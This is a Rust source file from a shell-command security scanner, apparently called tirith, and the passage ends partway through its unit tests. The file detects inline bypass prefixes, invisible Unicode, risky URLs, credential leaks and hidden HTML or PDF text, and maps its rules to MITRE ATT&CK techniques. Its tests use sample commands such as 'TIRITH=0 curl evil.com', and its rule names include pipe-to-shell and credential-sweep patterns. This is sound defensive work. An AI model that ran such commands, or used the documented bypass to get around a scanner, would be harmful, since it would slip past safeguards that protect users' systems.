use std::time::Instant;

use crate::extract::{self, ScanContext};
use crate::normalize;
use crate::policy::Policy;
use crate::tokenize::ShellType;
use crate::verdict::{Finding, Timings, Verdict};

/// Extract the raw path from a URL string before any normalization.
fn extract_raw_path_from_url(raw: &str) -> Option<String> {
    if let Some(idx) = raw.find("://") {
        let after = &raw[idx + 3..];
        if let Some(slash_idx) = after.find('/') {
            // Find end of path (before ? or #)
            let path_start = &after[slash_idx..];
            let end = path_start.find(['?', '#']).unwrap_or(path_start.len());
            return Some(path_start[..end].to_string());
        }
    }
    None
}

/// Analysis context passed through the pipeline.
pub struct AnalysisContext {
    pub input: String,
    pub shell: ShellType,
    pub scan_context: ScanContext,
    pub raw_bytes: Option<Vec<u8>>,
    pub interactive: bool,
    pub cwd: Option<String>,
    /// File path being scanned (only populated for ScanContext::FileScan).
    pub file_path: Option<std::path::PathBuf>,
    /// Only populated for ScanContext::FileScan. When None, configfile checks use
    /// `file_path`'s parent as implicit repo root.
    pub repo_root: Option<String>,
    /// True when `file_path` was explicitly provided by the user as a config file.
    pub is_config_override: bool,
    /// Clipboard HTML content for rich-text paste analysis.
    /// Only populated when `tirith paste --html <path>` is used.
    pub clipboard_html: Option<String>,
}

/// Check if a VAR=VALUE word is `TIRITH=0`, stripping optional surrounding quotes
/// from the value (handles `TIRITH='0'` and `TIRITH="0"`).
fn is_tirith_zero_assignment(word: &str) -> bool {
    if let Some((name, raw_val)) = word.split_once('=') {
        let val = raw_val.trim_matches(|c: char| c == '\'' || c == '"');
        if name == "TIRITH" && val == "0" {
            return true;
        }
    }
    false
}

/// Check if the input contains an inline `TIRITH=0` bypass prefix.
/// Handles POSIX bare prefix (`TIRITH=0 cmd`), env wrappers (`env -i TIRITH=0 cmd`),
/// and PowerShell env syntax (`$env:TIRITH="0"; cmd`).
fn find_inline_bypass(input: &str, shell: ShellType) -> bool {
    use crate::tokenize;

    if matches!(shell, ShellType::Posix | ShellType::Fish) {
        let segments = tokenize::tokenize(input, shell);
        if segments.len() != 1 || has_unquoted_ampersand(input, shell) {
            return false;
        }
    }

    let words = split_raw_words(input, shell);
    if words.is_empty() {
        return false;
    }

    // POSIX / Fish: VAR=VALUE prefix or env wrapper
    // (Fish 3.1+ and all POSIX shells support `TIRITH=0 command`)

    // Case 1: Leading VAR=VALUE assignments before the command
    let mut idx = 0;
    while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
        if is_tirith_zero_assignment(&words[idx]) {
            return true;
        }
        idx += 1;
    }

    // Case 2: First real word is `env` — parse env-style args
    if idx < words.len() {
        let cmd = words[idx].rsplit('/').next().unwrap_or(&words[idx]);
        let cmd = cmd.trim_matches(|c: char| c == '\'' || c == '"');
        if cmd == "env" {
            idx += 1;
            while idx < words.len() {
                let w = &words[idx];
                if w == "--" {
                    idx += 1;
                    // After --, remaining are VAR=VALUE or command
                    break;
                }
                if tokenize::is_env_assignment(w) {
                    if is_tirith_zero_assignment(w) {
                        return true;
                    }
                    idx += 1;
                    continue;
                }
                if w.starts_with('-') {
                    if w.starts_with("--") {
                        if env_long_flag_takes_value(w) && !w.contains('=') {
                            idx += 2;
                        } else {
                            idx += 1;
                        }
                        continue;
                    }
                    // Short flags that take a separate value arg
                    if w == "-u" || w == "-C" || w == "-S" {
                        idx += 2;
                        continue;
                    }
                    idx += 1;
                    continue;
                }
                // Non-flag, non-assignment = the command, stop
                break;
            }
            // Check remaining words after -- for TIRITH=0
            while idx < words.len() && tokenize::is_env_assignment(&words[idx]) {
                if is_tirith_zero_assignment(&words[idx]) {
                    return true;
                }
                idx += 1;
            }
        }
    }

    // PowerShell: $env:TIRITH="0" or $env:TIRITH = "0" (before first ;)
    if shell == ShellType::PowerShell {
        for word in &words {
            if is_powershell_tirith_bypass(word) {
                return true;
            }
        }
        // Multi-word: $env:TIRITH = "0" (space around =)
        if words.len() >= 3 {
            for window in words.windows(3) {
                if is_powershell_env_ref(&window[0], "TIRITH")
                    && window[1] == "="
                    && strip_surrounding_quotes(&window[2]) == "0"
                {
                    return true;
                }
            }
        }
    }

    // Cmd: "set TIRITH=0 & ..." or 'set "TIRITH=0" & ...'
    // In cmd.exe, `set TIRITH="0"` stores the literal `"0"` (with quotes) as the
    // value, so we must NOT strip inner quotes from the value. Only bare `TIRITH=0`
    // and whole-token-quoted `"TIRITH=0"` are real bypasses.
    if shell == ShellType::Cmd && words.len() >= 2 {
        let first = words[0].to_lowercase();
        if first == "set" {
            let second = strip_double_quotes_only(&words[1]);
            if let Some((name, val)) = second.split_once('=') {
                if name == "TIRITH" && val == "0" {
                    return true;
                }
            }
        }
    }

    false
}

fn env_long_flag_takes_value(flag: &str) -> bool {
    let name = flag.split_once('=').map(|(name, _)| name).unwrap_or(flag);
    matches!(name, "--unset" | "--chdir" | "--split-string")
}

/// Check if a word is `$env:TIRITH=0` with optional quotes around the value.
/// The `$env:` prefix is matched case-insensitively (PowerShell convention).
fn is_powershell_tirith_bypass(word: &str) -> bool {
    if !word.starts_with('$') || word.len() < "$env:TIRITH=0".len() {
        return false;
    }
    let after_dollar = &word[1..];
    if !after_dollar
        .get(..4)
        .is_some_and(|s| s.eq_ignore_ascii_case("env:"))
    {
        return false;
    }
    let after_env = &after_dollar[4..];
    if !after_env
        .get(..7)
        .is_some_and(|s| s.eq_ignore_ascii_case("TIRITH="))
    {
        return false;
    }
    let value = &after_env[7..];
    strip_surrounding_quotes(value) == "0"
}

/// Check if a word is a PowerShell env var reference `$env:VARNAME` (no assignment).
fn is_powershell_env_ref(word: &str, var_name: &str) -> bool {
    if !word.starts_with('$') {
        return false;
    }
    let after_dollar = &word[1..];
    if !after_dollar
        .get(..4)
        .is_some_and(|s| s.eq_ignore_ascii_case("env:"))
    {
        return false;
    }
    after_dollar[4..].eq_ignore_ascii_case(var_name)
}

/// Strip a single layer of matching quotes (single or double) from a string.
fn strip_surrounding_quotes(s: &str) -> &str {
    if s.len() >= 2
        && ((s.starts_with('"') && s.ends_with('"')) || (s.starts_with('\'') && s.ends_with('\'')))
    {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

/// Strip a single layer of matching double quotes only. For Cmd, single quotes are literal.
fn strip_double_quotes_only(s: &str) -> &str {
    if s.len() >= 2 && s.starts_with('"') && s.ends_with('"') {
        &s[1..s.len() - 1]
    } else {
        s
    }
}

/// Split input into raw words respecting quotes (for bypass/self-invocation parsing).
/// Unlike tokenize(), this doesn't split on pipes/semicolons — just whitespace-splits
/// the raw input to inspect the first segment's words.
///
/// Shell-aware: POSIX uses backslash as escape inside double-quotes and bare context;
/// PowerShell uses backtick (`` ` ``) instead.
fn split_raw_words(input: &str, shell: ShellType) -> Vec<String> {
    let escape_char = match shell {
        ShellType::PowerShell => '`',
        ShellType::Cmd => '^',
        _ => '\\',
    };

    // Take only up to the first unquoted pipe/semicolon/&&/||
    let mut words = Vec::new();
    let mut current = String::new();
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;

    while i < len {
        let ch = chars[i];
        match ch {
            ' ' | '\t' if !current.is_empty() => {
                words.push(current.clone());
                current.clear();
                i += 1;
                while i < len && (chars[i] == ' ' || chars[i] == '\t') {
                    i += 1;
                }
            }
            ' ' | '\t' => {
                i += 1;
            }
            '|' | '\n' | '&' => break, // Stop at segment boundary
            ';' if shell != ShellType::Cmd => break,
            '#' if shell == ShellType::PowerShell => break,
            '\'' if shell != ShellType::Cmd => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '\'' {
                    current.push(chars[i]);
                    i += 1;
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            '"' => {
                current.push(ch);
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == escape_char && i + 1 < len {
                        current.push(chars[i]);
                        current.push(chars[i + 1]);
                        i += 2;
                    } else {
                        current.push(chars[i]);
                        i += 1;
                    }
                }
                if i < len {
                    current.push(chars[i]);
                    i += 1;
                }
            }
            c if c == escape_char && i + 1 < len => {
                current.push(chars[i]);
                current.push(chars[i + 1]);
                i += 2;
            }
            _ => {
                current.push(ch);
                i += 1;
            }
        }
    }
    if !current.is_empty() {
        words.push(current);
    }
    words
}

/// Check if input contains an unquoted `&` (backgrounding operator).
fn has_unquoted_ampersand(input: &str, shell: ShellType) -> bool {
    let escape_char = match shell {
        ShellType::PowerShell => '`',
        ShellType::Cmd => '^',
        _ => '\\',
    };
    let chars: Vec<char> = input.chars().collect();
    let len = chars.len();
    let mut i = 0;
    while i < len {
        match chars[i] {
            '\'' if shell != ShellType::Cmd => {
                i += 1;
                while i < len && chars[i] != '\'' {
                    i += 1;
                }
                if i < len {
                    i += 1;
                }
            }
            '"' => {
                i += 1;
                while i < len && chars[i] != '"' {
                    if chars[i] == escape_char && i + 1 < len {
                        i += 2;
                    } else {
                        i += 1;
                    }
                }
                if i < len {
                    i += 1;
                }
            }
            c if c == escape_char && i + 1 < len => {
                i += 2; // skip escaped char
            }
            '&' => return true,
            _ => i += 1,
        }
    }
    false
}

/// Run the tiered analysis pipeline.
pub fn analyze(ctx: &AnalysisContext) -> Verdict {
    let start = Instant::now();

    // Tier 0: Check bypass flag
    let tier0_start = Instant::now();
    let bypass_env = std::env::var("TIRITH").ok().as_deref() == Some("0");
    let bypass_inline = find_inline_bypass(&ctx.input, ctx.shell);
    let bypass_requested = bypass_env || bypass_inline;
    let tier0_ms = tier0_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 1: Fast scan (no I/O)
    let tier1_start = Instant::now();

    // Step 1 (paste only): byte-level scan for control chars
    let byte_scan_triggered = if ctx.scan_context == ScanContext::Paste {
        if let Some(ref bytes) = ctx.raw_bytes {
            let scan = extract::scan_bytes(bytes);
            scan.has_ansi_escapes
                || scan.has_control_chars
                || scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_invalid_utf8
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
        } else {
            false
        }
    } else {
        false
    };

    // Step 2: URL-like regex scan
    let regex_triggered = extract::tier1_scan(&ctx.input, ctx.scan_context);

    // Step 3 (exec only): check for bidi/zero-width/invisible chars even without URLs
    let exec_bidi_triggered = if ctx.scan_context == ScanContext::Exec {
        let scan = extract::scan_bytes(ctx.input.as_bytes());
        scan.has_bidi_controls
            || scan.has_zero_width
            || scan.has_unicode_tags
            || scan.has_variation_selectors
            || scan.has_invisible_math_operators
            || scan.has_invisible_whitespace
    } else {
        false
    };

    let tier1_ms = tier1_start.elapsed().as_secs_f64() * 1000.0;

    // If nothing triggered, fast exit
    if !byte_scan_triggered && !regex_triggered && !exec_bidi_triggered {
        let total_ms = start.elapsed().as_secs_f64() * 1000.0;
        return Verdict::allow_fast(
            1,
            Timings {
                tier0_ms,
                tier1_ms,
                tier2_ms: None,
                tier3_ms: None,
                total_ms,
            },
        );
    }

    // Tier 2: Policy + data loading (deferred I/O)
    let tier2_start = Instant::now();

    if bypass_requested {
        // Load partial policy to check bypass settings
        let policy = Policy::discover_partial(ctx.cwd.as_deref());
        let allow_bypass = if ctx.interactive {
            policy.allow_bypass_env
        } else {
            policy.allow_bypass_env_noninteractive
        };

        if allow_bypass {
            let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;
            let total_ms = start.elapsed().as_secs_f64() * 1000.0;
            let mut verdict = Verdict::allow_fast(
                2,
                Timings {
                    tier0_ms,
                    tier1_ms,
                    tier2_ms: Some(tier2_ms),
                    tier3_ms: None,
                    total_ms,
                },
            );
            verdict.bypass_requested = true;
            verdict.bypass_honored = true;
            verdict.interactive_detected = ctx.interactive;
            verdict.policy_path_used = policy.path.clone();
            // Log bypass to audit (include custom DLP patterns from partial policy)
            crate::audit::log_verdict(
                &verdict,
                &ctx.input,
                None,
                None,
                &policy.dlp_custom_patterns,
            );
            return verdict;
        }
    }

    let mut policy = Policy::discover(ctx.cwd.as_deref());
    policy.load_user_lists();
    policy.load_org_lists(ctx.cwd.as_deref());
    let tier2_ms = tier2_start.elapsed().as_secs_f64() * 1000.0;

    // Tier 3: Full analysis
    let tier3_start = Instant::now();
    let mut findings = Vec::new();

    // Track extracted URLs for allowlist/blocklist (Exec/Paste only)
    let mut extracted = Vec::new();

    if ctx.scan_context == ScanContext::FileScan {
        // FileScan: byte scan + configfile rules ONLY.
        // Does NOT run command/env/URL-extraction rules.
        let byte_input = if let Some(ref bytes) = ctx.raw_bytes {
            bytes.as_slice()
        } else {
            ctx.input.as_bytes()
        };
        let byte_findings = crate::rules::terminal::check_bytes(byte_input);
        findings.extend(byte_findings);

        // Config file detection rules
        findings.extend(crate::rules::configfile::check(
            &ctx.input,
            ctx.file_path.as_deref(),
            ctx.repo_root.as_deref().map(std::path::Path::new),
            ctx.is_config_override,
        ));

        // Code file pattern scanning rules
        if crate::rules::codefile::is_code_file(
            ctx.file_path.as_deref().and_then(|p| p.to_str()),
            &ctx.input,
        ) {
            findings.extend(crate::rules::codefile::check(
                &ctx.input,
                ctx.file_path.as_deref().and_then(|p| p.to_str()),
            ));
        }

        // Rendered content rules (file-type gated)
        if crate::rules::rendered::is_renderable_file(ctx.file_path.as_deref()) {
            // PDF files get their own parser
            let is_pdf = ctx
                .file_path
                .as_deref()
                .and_then(|p| p.extension())
                .and_then(|e| e.to_str())
                .map(|e| e.eq_ignore_ascii_case("pdf"))
                .unwrap_or(false);

            if is_pdf {
                let pdf_bytes = ctx.raw_bytes.as_deref().unwrap_or(ctx.input.as_bytes());
                findings.extend(crate::rules::rendered::check_pdf(pdf_bytes));
            } else {
                findings.extend(crate::rules::rendered::check(
                    &ctx.input,
                    ctx.file_path.as_deref(),
                ));
            }
        }
    } else {
        // Exec/Paste: standard pipeline

        // Run byte-level rules for paste context
        if ctx.scan_context == ScanContext::Paste {
            if let Some(ref bytes) = ctx.raw_bytes {
                let byte_findings = crate::rules::terminal::check_bytes(bytes);
                findings.extend(byte_findings);
            }
            // Check for hidden multiline content in pasted text
            let multiline_findings = crate::rules::terminal::check_hidden_multiline(&ctx.input);
            findings.extend(multiline_findings);

            // Check clipboard HTML for hidden content (rich-text paste analysis)
            if let Some(ref html) = ctx.clipboard_html {
                let clipboard_findings =
                    crate::rules::terminal::check_clipboard_html(html, &ctx.input);
                findings.extend(clipboard_findings);
            }
        }

        // Invisible character checks apply to both exec and paste contexts
        if ctx.scan_context == ScanContext::Exec {
            let byte_input = ctx.input.as_bytes();
            let scan = extract::scan_bytes(byte_input);
            if scan.has_bidi_controls
                || scan.has_zero_width
                || scan.has_unicode_tags
                || scan.has_variation_selectors
                || scan.has_invisible_math_operators
                || scan.has_invisible_whitespace
            {
                let byte_findings = crate::rules::terminal::check_bytes(byte_input);
                // Only keep invisible-char findings for exec context
                findings.extend(byte_findings.into_iter().filter(|f| {
                    matches!(
                        f.rule_id,
                        crate::verdict::RuleId::BidiControls
                            | crate::verdict::RuleId::ZeroWidthChars
                            | crate::verdict::RuleId::UnicodeTags
                            | crate::verdict::RuleId::InvisibleMathOperator
                            | crate::verdict::RuleId::VariationSelector
                            | crate::verdict::RuleId::InvisibleWhitespace
                    )
                }));
            }
        }

        // Extract and analyze URLs
        extracted = extract::extract_urls(&ctx.input, ctx.shell);

        for url_info in &extracted {
            // Normalize path if available — use raw extracted URL's path for non-ASCII detection
            // since url::Url percent-encodes non-ASCII during parsing
            let raw_path = extract_raw_path_from_url(&url_info.raw);
            let normalized_path = url_info.parsed.path().map(normalize::normalize_path);

            // Run all rule categories
            let hostname_findings = crate::rules::hostname::check(&url_info.parsed, &policy);
            findings.extend(hostname_findings);

            let path_findings = crate::rules::path::check(
                &url_info.parsed,
                normalized_path.as_ref(),
                raw_path.as_deref(),
            );
            findings.extend(path_findings);

            let transport_findings =
                crate::rules::transport::check(&url_info.parsed, url_info.in_sink_context);
            findings.extend(transport_findings);

            let ecosystem_findings = crate::rules::ecosystem::check(&url_info.parsed);
            findings.extend(ecosystem_findings);
        }

        // Run command-shape rules on full input
        let command_findings = crate::rules::command::check(
            &ctx.input,
            ctx.shell,
            ctx.cwd.as_deref(),
            ctx.scan_context,
        );
        findings.extend(command_findings);

        // Run credential leak detection rules
        let cred_findings =
            crate::rules::credential::check(&ctx.input, ctx.shell, ctx.scan_context);
        findings.extend(cred_findings);

        // Run environment rules
        let env_findings = crate::rules::environment::check(&crate::rules::environment::RealEnv);
        findings.extend(env_findings);

        // Policy-driven network deny/allow
        if !policy.network_deny.is_empty() {
            let net_findings = crate::rules::command::check_network_policy(
                &ctx.input,
                ctx.shell,
                &policy.network_deny,
                &policy.network_allow,
            );
            findings.extend(net_findings);
        }
    }

    // Custom YAML detection rules
    if !policy.custom_rules.is_empty() {
        let compiled = crate::rules::custom::compile_rules(&policy.custom_rules);
        let custom_findings = crate::rules::custom::check(&ctx.input, ctx.scan_context, &compiled);
        findings.extend(custom_findings);
    }

    // Apply policy severity overrides
    for finding in &mut findings {
        if let Some(override_sev) = policy.severity_override(&finding.rule_id) {
            finding.severity = override_sev;
        }
    }

    // Filter by allowlist/blocklist
    // Blocklist: if any extracted URL matches blocklist, escalate to Block
    for url_info in &extracted {
        if policy.is_blocklisted(&url_info.raw) {
            findings.push(Finding {
                rule_id: crate::verdict::RuleId::PolicyBlocklisted,
                severity: crate::verdict::Severity::Critical,
                title: "URL matches blocklist".to_string(),
                description: format!("URL '{}' matches a blocklist pattern", url_info.raw),
                evidence: vec![crate::verdict::Evidence::Url {
                    raw: url_info.raw.clone(),
                }],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            });
        }
    }

    // Allowlist: remove findings for URLs that match allowlist
    // (blocklist takes precedence — if blocklisted, findings remain)
    if !policy.allowlist.is_empty() || !policy.allowlist_rules.is_empty() {
        let blocklisted_urls: Vec<&str> = extracted
            .iter()
            .filter(|u| policy.is_blocklisted(&u.raw))
            .map(|u| u.raw.as_str())
            .collect();

        findings.retain(|f| {
            let urls_in_evidence: Vec<&str> = f
                .evidence
                .iter()
                .filter_map(|e| match e {
                    crate::verdict::Evidence::Url { raw } => Some(raw.as_str()),
                    _ => None,
                })
                .collect();

            if urls_in_evidence.is_empty() {
                return true;
            }

            let rule_allowlisted = |url: &str| {
                policy.is_allowlisted_for_rule(&f.rule_id.to_string(), url)
                    || f.custom_rule_id.as_deref().is_some_and(|custom_rule_id| {
                        policy.is_allowlisted_for_rule(custom_rule_id, url)
                    })
            };

            // Keep if any referenced URL is blocklisted. Otherwise only drop the
            // finding when every referenced URL is allowlisted for this finding.
            urls_in_evidence
                .iter()
                .any(|url| blocklisted_urls.contains(url))
                || !urls_in_evidence
                    .iter()
                    .all(|url| policy.is_allowlisted(url) || rule_allowlisted(url))
        });
    }

    // Enrichment is always enabled in the single-tier runtime.
    enrich_pro(&mut findings);
    enrich_team(&mut findings);

    // Early-access suppression is disabled in the single-tier runtime.
    crate::rule_metadata::filter_early_access(&mut findings, crate::license::Tier::Enterprise);

    let tier3_ms = tier3_start.elapsed().as_secs_f64() * 1000.0;
    let total_ms = start.elapsed().as_secs_f64() * 1000.0;

    let mut verdict = Verdict::from_findings(
        findings,
        3,
        Timings {
            tier0_ms,
            tier1_ms,
            tier2_ms: Some(tier2_ms),
            tier3_ms: Some(tier3_ms),
            total_ms,
        },
    );
    verdict.bypass_requested = bypass_requested;
    verdict.interactive_detected = ctx.interactive;
    verdict.policy_path_used = policy.path.clone();
    verdict.urls_extracted_count = Some(extracted.len());

    verdict
}

// ---------------------------------------------------------------------------
// Paranoia tier filtering (Phase 15)
// ---------------------------------------------------------------------------

/// Filter a verdict's findings by paranoia level.
///
/// This is an output-layer filter — the engine always detects everything.
/// CLI/MCP call this after `analyze()` to reduce noise at lower paranoia levels.
///
/// - Paranoia 1-2: Medium+ findings only
/// - Paranoia 3: also show Low findings
/// - Paranoia 4: also show Info findings
pub fn filter_findings_by_paranoia(verdict: &mut Verdict, paranoia: u8) {
    retain_by_paranoia(&mut verdict.findings, paranoia);
    verdict.action = recalculate_action(&verdict.findings);
}

/// Filter a Vec<Finding> by paranoia level.
/// Same logic as `filter_findings_by_paranoia` but operates on raw findings.
pub fn filter_findings_by_paranoia_vec(findings: &mut Vec<Finding>, paranoia: u8) {
    retain_by_paranoia(findings, paranoia);
}

/// Recalculate verdict action from the current findings (same logic as `Verdict::from_findings`).
fn recalculate_action(findings: &[Finding]) -> crate::verdict::Action {
    use crate::verdict::{Action, Severity};
    if findings.is_empty() {
        return Action::Allow;
    }
    let max_severity = findings
        .iter()
        .map(|f| f.severity)
        .max()
        .unwrap_or(Severity::Low);
    match max_severity {
        Severity::Critical | Severity::High => Action::Block,
        Severity::Medium | Severity::Low => Action::Warn,
        Severity::Info => Action::Allow,
    }
}

/// Shared paranoia retention logic.
fn retain_by_paranoia(findings: &mut Vec<Finding>, paranoia: u8) {
    let effective = paranoia.min(4);

    findings.retain(|f| match f.severity {
        crate::verdict::Severity::Info => effective >= 4,
        crate::verdict::Severity::Low => effective >= 3,
        _ => true, // Medium/High/Critical always shown
    });
}

// ---------------------------------------------------------------------------
// Finding enrichment
// ---------------------------------------------------------------------------

/// Pro enrichment: dual-view, decoded content, cloaking diffs, line numbers.
fn enrich_pro(findings: &mut [Finding]) {
    for finding in findings.iter_mut() {
        match finding.rule_id {
            // Rendered content findings: show what human sees vs what agent processes
            crate::verdict::RuleId::HiddenCssContent => {
                finding.human_view =
                    Some("Content hidden via CSS — invisible in rendered view".into());
                finding.agent_view = Some(format!(
                    "AI agent sees full text including CSS-hidden content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HiddenColorContent => {
                finding.human_view =
                    Some("Text blends with background — invisible to human eye".into());
                finding.agent_view = Some(format!(
                    "AI agent reads text regardless of color contrast. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HiddenHtmlAttribute => {
                finding.human_view =
                    Some("Elements marked hidden/aria-hidden — not displayed".into());
                finding.agent_view = Some(format!(
                    "AI agent processes hidden element content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::HtmlComment => {
                finding.human_view = Some("HTML comments not rendered in browser".into());
                finding.agent_view = Some(format!(
                    "AI agent reads comment content as context. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::MarkdownComment => {
                finding.human_view = Some("Markdown comments not rendered in preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes markdown comment content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::PdfHiddenText => {
                finding.human_view = Some("Sub-pixel text invisible in PDF viewer".into());
                finding.agent_view = Some(format!(
                    "AI agent extracts all text including sub-pixel content. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            crate::verdict::RuleId::ClipboardHidden => {
                finding.human_view =
                    Some("Hidden content in clipboard HTML not visible in paste preview".into());
                finding.agent_view = Some(format!(
                    "AI agent processes full clipboard including hidden HTML. {}",
                    evidence_summary(&finding.evidence)
                ));
            }
            _ => {}
        }
    }
}

/// Summarize evidence entries for enrichment text.
fn evidence_summary(evidence: &[crate::verdict::Evidence]) -> String {
    let details: Vec<&str> = evidence
        .iter()
        .filter_map(|e| {
            if let crate::verdict::Evidence::Text { detail } = e {
                Some(detail.as_str())
            } else {
                None
            }
        })
        .take(3)
        .collect();
    if details.is_empty() {
        String::new()
    } else {
        format!("Details: {}", details.join("; "))
    }
}

/// MITRE ATT&CK technique mapping for built-in rules.
fn mitre_id_for_rule(rule_id: crate::verdict::RuleId) -> Option<&'static str> {
    use crate::verdict::RuleId;
    match rule_id {
        // Execution
        RuleId::PipeToInterpreter
        | RuleId::CurlPipeShell
        | RuleId::WgetPipeShell
        | RuleId::HttpiePipeShell
        | RuleId::XhPipeShell => Some("T1059.004"), // Command and Scripting Interpreter: Unix Shell

        // Persistence
        RuleId::DotfileOverwrite => Some("T1546.004"), // Event Triggered Execution: Unix Shell Config

        // Defense Evasion
        RuleId::BidiControls
        | RuleId::UnicodeTags
        | RuleId::ZeroWidthChars
        | RuleId::InvisibleMathOperator
        | RuleId::VariationSelector
        | RuleId::InvisibleWhitespace => {
            Some("T1036.005") // Masquerading: Match Legitimate Name or Location
        }
        RuleId::HiddenMultiline | RuleId::AnsiEscapes | RuleId::ControlChars => Some("T1036.005"),

        // Hijack Execution Flow
        RuleId::CodeInjectionEnv => Some("T1574.006"), // Hijack Execution Flow: Dynamic Linker Hijacking
        RuleId::InterpreterHijackEnv => Some("T1574.007"), // Path Interception by PATH
        RuleId::ShellInjectionEnv => Some("T1546.004"), // Shell Config Modification

        // Credential Access
        RuleId::CredentialInText | RuleId::HighEntropySecret => Some("T1552"), // Unsecured Credentials
        RuleId::PrivateKeyExposed => Some("T1552.004"),                        // Private Keys
        RuleId::MetadataEndpoint => Some("T1552.005"), // Unsecured Credentials: Cloud Instance Metadata
        RuleId::SensitiveEnvExport | RuleId::CredentialFileSweep => Some("T1552.001"), // Credentials In Files
        RuleId::ProcMemAccess => Some("T1003.007"), // OS Credential Dumping: Proc Filesystem
        RuleId::DockerRemotePrivEsc => Some("T1611"), // Escape to Host

        // Supply Chain
        RuleId::ConfigInjection => Some("T1195.001"), // Supply Chain Compromise: Dev Tools
        RuleId::McpInsecureServer | RuleId::McpSuspiciousArgs => Some("T1195.002"), // Compromise Software Supply Chain
        RuleId::GitTyposquat => Some("T1195.001"),
        RuleId::DockerUntrustedRegistry => Some("T1195.002"),

        // Discovery / Lateral Movement
        RuleId::PrivateNetworkAccess => Some("T1046"), // Network Service Discovery
        RuleId::ServerCloaking => Some("T1036"),       // Masquerading

        // Collection
        RuleId::ArchiveExtract => Some("T1560.001"), // Archive Collected Data: Archive via Utility

        // Exfiltration
        RuleId::ProxyEnvSet => Some("T1090.001"), // Proxy: Internal Proxy
        RuleId::DataExfiltration => Some("T1048.003"), // Exfiltration Over Unencrypted Non-C2 Protocol
        RuleId::SuspiciousCodeExfiltration => Some("T1041"), // Exfiltration Over C2 Channel

        // Command Obfuscation
        RuleId::Base64DecodeExecute => Some("T1027.010"), // Command Obfuscation
        RuleId::ObfuscatedPayload => Some("T1027"),       // Obfuscated Files or Information
        RuleId::DynamicCodeExecution => Some("T1059"),    // Command and Scripting Interpreter

        _ => None,
    }
}

/// Team enrichment: MITRE ATT&CK classification.
fn enrich_team(findings: &mut [Finding]) {
    for finding in findings.iter_mut() {
        if finding.mitre_id.is_none() {
            finding.mitre_id = mitre_id_for_rule(finding.rule_id).map(String::from);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    #[test]
    fn test_exec_bidi_without_url() {
        // Input with bidi control but no URL — should NOT fast-exit at tier 1
        let input = format!("echo hello{}world", '\u{202E}');
        let ctx = AnalysisContext {
            input,
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        };
        let verdict = analyze(&ctx);
        // Should reach tier 3 (not fast-exit at tier 1)
        assert!(
            verdict.tier_reached >= 3,
            "bidi in exec should reach tier 3, got tier {}",
            verdict.tier_reached
        );
        // Should have findings about bidi
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
            "should detect bidi controls in exec context"
        );
    }

    #[test]
    fn test_paranoia_filter_suppresses_info_low() {
        use crate::verdict::{Finding, RuleId, Severity, Timings, Verdict};

        let findings = vec![
            Finding {
                rule_id: RuleId::VariationSelector,
                severity: Severity::Info,
                title: "info finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::InvisibleWhitespace,
                severity: Severity::Low,
                title: "low finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::HiddenCssContent,
                severity: Severity::High,
                title: "high finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
        ];

        let timings = Timings {
            tier0_ms: 0.0,
            tier1_ms: 0.0,
            tier2_ms: None,
            tier3_ms: None,
            total_ms: 0.0,
        };

        // Default paranoia (1): only Medium+ shown
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 1);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 1 should keep only High+"
        );
        assert_eq!(verdict.findings[0].severity, Severity::High);

        // Paranoia 2: still only Medium+ (free tier cap)
        let mut verdict = Verdict::from_findings(findings.clone(), 3, timings.clone());
        filter_findings_by_paranoia(&mut verdict, 2);
        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 2 should keep only Medium+"
        );
    }

    #[test]
    fn test_inline_bypass_bare_prefix() {
        assert!(find_inline_bypass(
            "TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_wrapper() {
        assert!(find_inline_bypass(
            "env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_i() {
        assert!(find_inline_bypass(
            "env -i TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_u_skip() {
        assert!(find_inline_bypass(
            "env -u TIRITH TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_usr_bin_env() {
        assert!(find_inline_bypass(
            "/usr/bin/env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_dashdash() {
        assert!(find_inline_bypass(
